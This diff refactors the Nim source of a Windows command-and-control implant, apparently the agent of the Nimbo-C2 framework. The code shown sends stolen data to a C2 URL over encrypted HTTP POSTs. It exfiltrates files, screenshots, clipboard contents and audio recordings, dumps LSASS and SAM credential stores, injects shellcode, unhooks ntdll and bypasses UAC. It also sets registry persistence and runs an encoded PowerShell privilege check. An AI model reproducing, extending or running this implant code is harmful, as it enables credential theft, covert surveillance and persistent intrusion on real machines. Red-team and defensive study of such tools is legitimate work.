@@ -1,5 +1,8 @@
+# Internal imports
 include ../config
-import utils/[audio, clipboard, clr, enc, helpers, memops, misc, screenshot]
+import ../common
+import utils/[audio, clipboard, clr, helpers, memops, misc, screenshot]
+# External imports
 import std/[strformat, tables, nativesockets, random, json, streams]
 import winim/[lean, com]
 import wAuto/[registry]
@@ -14,12 +17,10 @@ import os
 # Core functions
 proc start(): void
 proc parse_command(command: JsonNode): bool
-proc post_data(command_type: string, data_dict: string): bool
 proc nimbo_main*(): void 
 
 # Command executors
 proc collect_data(): bool
-proc run_shell_command(shell_command: string): bool
 proc wrap_execute_encoded_powershell(encoded_powershell_command: string, ps_module=""): bool
 proc exfil_file(file_path: string): bool
 proc write_file(file_data_base64: string, file_path: string): bool
@@ -44,11 +45,10 @@ proc kill_agent(): void
 # Helpers
 proc get_agent_id(): string
 proc is_elevated(): string
-proc calc_sleep_time(timeframe: int,  jitter_percent: int): int
 
 # Globals
-let c2_url = fmt"{c2_scheme}://{c2_address}:{c2_port}"
 let client = newHttpClient(userAgent=get_agent_id())
+let c2_url = fmt"{c2_scheme}://{c2_address}:{c2_port}"
 
 
 #########################
@@ -110,29 +110,8 @@ proc collect_data(): bool =
     
     }.toOrderedTable()
     
-    is_success = post_data(protectString("collect") , $data)
+    is_success = post_data(client, protectString("collect") , $data)
 
-    return is_success
-
-
-proc run_shell_command(shell_command: string): bool =
-    var output: string
-    var is_success: bool
-
-    try:
-        # output = execCmdEx(shell_command)[0]
-        output = execCmdEx(shell_command, options={poDaemon})[0]
-
-    except:
-        output = could_not_retrieve
-    
-    var data = {
-        protectString("shell_command"): shell_command,
-        "output": output
-    }.toOrderedTable()
-
-    is_success = post_data(protectString("cmd"), $data)
-    
     return is_success
 
 
@@ -151,14 +130,14 @@ proc wrap_execute_encoded_powershell(encoded_powershell_command: string, ps_modu
             protectString("powershell_command"): decode_64(encoded_powershell_command),
             "output": output
         }.toOrderedTable()
-        is_success = post_data(protectString("iex"), $data)
+        is_success = post_data(client, protectString("iex"), $data)
     
     # command came from ps_module
     else:
         var data = {
             "output": output
         }.toOrderedTable()
-        is_success = post_data(ps_module, $data)
+        is_success = post_data(client, ps_module, $data)
 
     return is_success
 
@@ -180,7 +159,7 @@ proc exfil_file(file_path: string): bool =
         protectString("file_content_base64"): file_content_base64
     }.toOrderedTable()
     
-    is_success = post_data(protectString("download") , $data)
+    is_success = post_data(client, protectString("download") , $data)
 
     return is_success
 
@@ -202,7 +181,7 @@ proc write_file(file_data_base64: string, file_path: string): bool =
         protectString("file_upload_path"): file_path,
     }.toOrderedTable()
     
-    is_success = post_data(protectString("upload") , $data)
+    is_success = post_data(client, protectString("upload") , $data)
 
     return is_success
 
@@ -223,7 +202,7 @@ proc checksec(): bool =
         "products": products
     }.toOrderedTable()
     
-    is_success = post_data(protectString("checksec") , $data)
+    is_success = post_data(client, protectString("checksec") , $data)
 
     return is_success
 
@@ -243,7 +222,7 @@ proc wrap_get_clipboard(): bool =
         protectString("clipboard"): clipboard
     }.toOrderedTable()
     
-    is_success = post_data(protectString("clipboard") , $data)
+    is_success = post_data(client, protectString("clipboard") , $data)
 
     return is_success
 
@@ -263,7 +242,7 @@ proc wrap_get_screenshot(): bool =
         protectString("screenshot_base64"): encode_64(screenshot_stream, is_bin=true)
     }.toOrderedTable()
     
-    is_success = post_data(protectString("screenshot") , $data)
+    is_success = post_data(client, protectString("screenshot") , $data)
 
     return is_success
 
@@ -293,7 +272,7 @@ proc wrap_record_audio(record_time: int): bool =
         "is_success": $is_success,
         protectString("file_content_base64"): file_content_base64
     }.toOrderedTable
-    is_success = post_data(protectString("audio") , $data)
+    is_success = post_data(client, protectString("audio") , $data)
 
     return is_success
 
@@ -326,7 +305,7 @@ proc dump_lsass(dump_method: string): bool =
         "is_success": $is_success,
         protectString("file_content_base64"): file_content_base64
     }.toOrderedTable
-    is_success = post_data(protectString("lsass") , $data)
+    is_success = post_data(client, protectString("lsass") , $data)
 
     return is_success
 
@@ -374,7 +353,7 @@ proc dump_sam(): bool =
         protectString("sys_base64"): sys_base64
     }.toOrderedTable
 
-    is_success = post_data(protectString("sam") , $data)
+    is_success = post_data(client, protectString("sam") , $data)
 
 
 proc wrap_inject_shellc(shellc_base64: string, pid: int): bool =
@@ -387,7 +366,7 @@ proc wrap_inject_shellc(shellc_base64: string, pid: int): bool =
         "pid": $pid
     }.toOrderedTable
 
-    is_success = post_data(protectString("shellc") , $data)
+    is_success = post_data(client, protectString("shellc") , $data)
 
 
 proc wrap_execute_assembly(assembly_base64: string, assembly_args: string): bool =
@@ -401,7 +380,7 @@ proc wrap_execute_assembly(assembly_base64: string, assembly_args: string): bool
         "output": output
     }.toOrderedTable()
     
-    is_success = post_data(protectString("assembly"), $data)
+    is_success = post_data(client, protectString("assembly"), $data)
 
     return is_success
 
@@ -414,7 +393,7 @@ proc wrap_unhook_ntdll(): bool =
         "is_success": $is_success
     }.toOrderedTable()
     
-    is_success = post_data(protectString("unhook") , $data)
+    is_success = post_data(client, protectString("unhook") , $data)
 
     return is_success
 
@@ -427,7 +406,7 @@ proc wrap_patch_func(command_name: string): bool =
         "is_success": $is_success
     }.toOrderedTable()
     
-    is_success = post_data(command_name , $data)
+    is_success = post_data(client, command_name , $data)
 
     return is_success
 
@@ -449,7 +428,7 @@ proc set_run_key(key_name: string, cmd: string): bool =
         protectString("persistence_command"): cmd
     }.toOrderedTable()
 
-    is_success = post_data(protectString("persist-run"), $data)
+    is_success = post_data(client, protectString("persist-run"), $data)
     
     return is_success
 
@@ -468,7 +447,7 @@ proc set_spe(process_name: string, cmd: string): bool =
         protectString("persistence_command"): cmd
     }.toOrderedTable()
     
-    is_success = post_data(protectString("persist-spe"), $data)
+    is_success = post_data(client, protectString("persist-spe"), $data)
 
     return is_success
 
@@ -500,7 +479,7 @@ proc uac_bypass(bypass_method: string, cmd: string, keep_or_die: string): bool =
         "keep_or_die": keep_or_die
     }.toOrderedTable
     
-    is_success_post = post_data(protectString("uac-") & bypass_method , $data)
+    is_success_post = post_data(client, protectString("uac-") & bypass_method , $data)
 
     sleep(2000)
     regDelete(reg_path, "")
@@ -527,7 +506,7 @@ proc msgbox(title: string, text: string): bool =
         
     }.toOrderedTable()
     
-    is_success = post_data("msgbox" , $data)
+    is_success = post_data(client, "msgbox" , $data)
     return is_success
 
 
@@ -547,7 +526,7 @@ proc speak(text: string): bool =
         "text": text
     }.toOrderedTable()
     
-    is_success = post_data(protectString("speak") , $data)
+    is_success = post_data(client, protectString("speak") , $data)
     return is_success
 
 
@@ -561,13 +540,13 @@ proc change_sleep_time(timeframe: int,  jitter_percent: int): bool =
         protectString("sleep_jitter_percent"): $call_home_jitter_percent
     }.toOrderedTable()
     
-    is_success = post_data(protectString("sleep") , $data)
+    is_success = post_data(client, protectString("sleep") , $data)
     return is_success
 
 
 proc kill_agent(): void =
     
-    discard post_data(protectString("kill") , """{"Good bye": ":("}""")
+    discard post_data(client, protectString("kill") , """{"Good bye": ":("}""")
     ExitProcess(0)
 
 
@@ -595,12 +574,6 @@ proc get_agent_id(): string =
 
 proc is_elevated(): string =
     return execute_encoded_powershell(protectString("KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBTAGUAYwB1AHIAaQB0AHkALgBQAHIAaQBuAGMAaQBwAGEAbAAuAFcAaQBuAGQAbwB3AHMAUAByAGkAbgBjAGkAcABhAGwAKABbAFMAeQBzAHQAZQBtAC4AUwBlAGMAdQByAGkAdAB5AC4AUAByAGkAbgBjAGkAcABhAGwALgBXAGkAbgBkAG8AdwBzAEkAZABlAG4AdABpAHQAeQBdADoAOgBHAGUAdABDAHUAcgByAGUAbgB0ACgAKQApACkALgBJAHMASQBuAFIAbwBsAGUAKAAiAEEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAcwAiACkA"))
-
-
-proc calc_sleep_time(timeframe: int,  jitter_percent: int): int =
-    var jitter_range = ((jitter_percent * timeframe) / 100)
-    var jitter_random = rand(((jitter_range / 2) * -1)..(jitter_range / 2))
-    return (timeframe + int(jitter_random)) * 1000
 
 
 ##########################
@@ -679,15 +652,6 @@ proc parse_command(command: JsonNode): bool =
         else:
             is_success = false
     return is_success
-        
-
-proc post_data(command_type: string, data_dict: string): bool =
-    var data_to_send = """{"command_type": """" & command_type & """", "data": """ & data_dict & "}"
-    try:
-        discard client.post(c2_url, body=encrypt_cbc(data_to_send, communication_aes_key, communication_aes_iv))
-        return true
-    except:
-        return false
 
 
 proc nimbo_main*(): void =
